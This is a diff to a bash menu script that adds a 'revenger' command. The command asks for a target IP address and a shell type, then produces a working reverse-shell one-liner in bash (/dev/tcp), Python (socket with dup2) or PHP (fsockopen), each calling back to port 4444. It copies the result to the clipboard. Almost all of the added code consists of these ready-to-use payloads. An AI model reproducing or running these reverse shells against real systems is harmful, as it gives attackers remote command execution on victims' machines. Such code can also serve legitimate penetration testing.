@@ -299,6 +299,30 @@ do
 			eval "uname -r"
 		
 			echo -n -e "${nc}"
+	elif [[ ${cmd} == "revenger" ]]
+        then
+                        echo -n -e "${blue}"
+                        echo "revenger" | figlet
+			echo "Enter target IP address:"
+			read ip_address
+			echo "Enter shell type (bash/python/php):"
+			read shell_type
+			if [ "$shell_type" = "bash" ]
+			then
+    				rev_shell="bash -i >& /dev/tcp/$ip_address/4444 0>&1"
+			elif [ "$shell_type" = "python" ]
+			then
+				rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+			elif [ "$shell_type" = "php" ]
+			then
+				rev_shell="php -r '\$sock=fsockopen(\"$ip_address\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+			else
+				echo "Invalid shell type. Valid options are bash, python, or php."
+				exit 1
+			fi
+			echo "$rev_shell" | xclip -selection clipboard
+			echo "Reverse shell generated and copied to clipboard!"
+			echo -n -e "${nc}"
 	elif [[ ${cmd} == "SplitV" ]]
     	then
     			echo -n -e "${purple}"
